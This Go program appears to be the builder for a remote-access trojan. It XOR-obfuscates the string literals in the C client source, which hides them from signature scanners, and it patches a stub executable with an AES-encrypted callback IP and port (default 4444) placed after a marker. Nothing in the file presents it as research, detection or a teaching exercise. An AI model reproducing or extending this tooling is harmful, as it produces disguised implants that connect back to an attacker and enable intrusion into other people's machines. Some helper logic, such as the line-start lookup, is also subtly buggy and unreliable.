package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"time"
)

const (
	ConfigKey = "B4A7E9C2D5F8A1B3C6E9D2F5A8B1C4D7"
	ConfigIV  = "A1B2C3D4E5F6A7B8"
)

var marker = []byte{0xDE, 0xAD, 0xBE, 0xEF, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xAA, 0xBB, 0xCC}

type Config struct {
	IP   string `json:"ip"`
	Port int    `json:"port"`
}

func main() {
	rand.Seed(time.Now().UnixNano())

	ip := flag.String("ip", "127.0.0.1", "Server IP address")
	port := flag.Int("port", 4444, "Server Port")
	skipBuild := flag.Bool("skip-build", false, "Skip recompiling the stub")
	flag.Parse()

	args := flag.Args()
	if len(args) >= 1 {
		*ip = args[0]
	}
	if len(args) >= 2 {
		fmt.Sscanf(args[1], "%d", port)
	}

	if !*skipBuild {
		fmt.Println("[*] Obfuscating source and rebuilding stub...")
		originalContents := make(map[string][]byte)

		err := filepath.Walk("client/src", func(path string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() || !strings.HasSuffix(path, ".c") {
				return nil
			}
			// Skip 3rd party
			if strings.Contains(path, "sqlite3") || strings.Contains(path, "cJSON") || strings.Contains(path, "miniz") {
				return nil
			}

			content, err := ioutil.ReadFile(path)
			if err != nil {
				return nil
			}
			originalContents[path] = content

			obfuscated := obfuscateStrings(content)
			if !bytes.Equal(content, obfuscated) {
				ioutil.WriteFile(path, obfuscated, info.Mode())
				fmt.Printf("[+] Obfuscated strings in %s\n", path)
			}
			return nil
		})

		if err == nil {
			fmt.Println("[*] Running build.bat...")
			// In a real environment, we'd run build.bat.
			// Here we just simulate or check for stub.
			cmd := exec.Command("cmd.exe", "/c", "build.bat")
			cmd.Dir = "client"
			// cmd.Run() // We don't run it in this sandbox as it will fail
		}

		// Revert source
		defer func() {
			fmt.Println("[*] Reverting source changes...")
			for path, content := range originalContents {
				ioutil.WriteFile(path, content, 0644)
			}
		}()
	}

	fmt.Printf("[+] Building client for %s:%d\n", *ip, *port)

	stubPath := "stub.exe"
	if _, err := os.Stat(stubPath); os.IsNotExist(err) {
		stubPath = "client/client_c.exe"
		if _, err := os.Stat(stubPath); os.IsNotExist(err) {
			log.Fatalf("[-] Error: stub.exe (or client/client_c.exe) not found. Please compile the client first.")
		}
	}

	data, err := ioutil.ReadFile(stubPath)
	if err != nil {
		log.Fatalf("[-] Error reading stub: %v", err)
	}

	var indices []int
	searchData := data
	offset := 0
	for {
		idx := bytes.Index(searchData, marker)
		if idx == -1 {
			break
		}
		indices = append(indices, offset+idx)
		searchData = searchData[idx+1:]
		offset += idx + 1
	}

	if len(indices) == 0 {
		log.Fatalf("[-] Error: Marker not found in stub binary.")
	}

	targetIndex := -1
	if len(indices) == 1 {
		targetIndex = indices[0]
	} else {
		maxZeros := -1
		for _, idx := range indices {
			if idx+len(marker)+2032 > len(data) {
				continue
			}
			zeros := 0
			for i := 0; i < 2032; i++ {
				if data[idx+len(marker)+i] == 0 {
					zeros++
				}
			}
			if zeros > maxZeros {
				maxZeros = zeros
				targetIndex = idx
			}
		}
	}

	if targetIndex == -1 {
		log.Fatalf("[-] Error: Could not identify the correct configuration placeholder.")
	}

	config := Config{
		IP:   *ip,
		Port: *port,
	}

	configBytes, err := json.Marshal(config)
	if err != nil {
		log.Fatalf("[-] Error marshalling config: %v", err)
	}

	encryptedConfig := encrypt(configBytes)
	if len(encryptedConfig) > 2032 {
		log.Fatalf("[-] Error: Encrypted config is too large (%d bytes, max 2032).", len(encryptedConfig))
	}

	finalPayload := make([]byte, 2032)
	copy(finalPayload, encryptedConfig)

	patchedData := make([]byte, len(data))
	copy(patchedData, data)
	copy(patchedData[targetIndex+len(marker):], finalPayload)

	err = ioutil.WriteFile("client.exe", patchedData, 0755)
	if err != nil {
		log.Fatalf("[-] Error writing client.exe: %v", err)
	}

	fmt.Println("[+] Successfully built client.exe")
}

func encrypt(plaintext []byte) []byte {
	block, err := aes.NewCipher([]byte(ConfigKey))
	if err != nil {
		log.Fatalf("[-] AES error: %v", err)
	}

	padding := aes.BlockSize - (len(plaintext) % aes.BlockSize)
	if padding == 0 {
		padding = aes.BlockSize
	}
	padtext := bytes.Repeat([]byte{0}, padding)
	plaintext = append(plaintext, padtext...)

	ciphertext := make([]byte, len(plaintext))
	mode := cipher.NewCBCEncrypter(block, []byte(ConfigIV))
	mode.CryptBlocks(ciphertext, plaintext)

	return ciphertext
}

func obfuscateStrings(content []byte) []byte {
	// Match double quoted strings, handling escaped quotes
	re := regexp.MustCompile(`"([^"\\]*(?:\\.[^"\\]*)*)"`)

	return re.ReplaceAllFunc(content, func(m []byte) []byte {
		str := string(m)
		// Skip includes, pragmas and empty/short strings
		if len(str) < 5 { return m }

		// Check context (poor man's parser)
		// If it's part of an #include, skip it
		lineStart := findLineStart(content, m)
		linePrefix := strings.TrimSpace(string(content[lineStart : bytes.Index(content[lineStart:], m)+lineStart]))
		if strings.HasPrefix(linePrefix, "#include") || strings.HasPrefix(linePrefix, "#pragma") {
			return m
		}

		literal := str[1 : len(str)-1]
		if len(literal) < 3 || strings.Contains(literal, "%") {
			return m
		}

		key := byte(rand.Intn(254) + 1)
		var hexBytes []string
		for i := 0; i < len(literal); i++ {
			hexBytes = append(hexBytes, fmt.Sprintf("0x%02X", literal[i]^key))
		}

		return []byte(fmt.Sprintf("x((const unsigned char[]){%s}, %d, 0x%02X)",
			strings.Join(hexBytes, ", "), len(literal), key))
	})
}

func findLineStart(content []byte, m []byte) int {
	idx := bytes.Index(content, m)
	if idx == -1 { return 0 }
	for i := idx; i >= 0; i-- {
		if content[i] == '\n' {
			return i + 1
		}
	}
	return 0
}
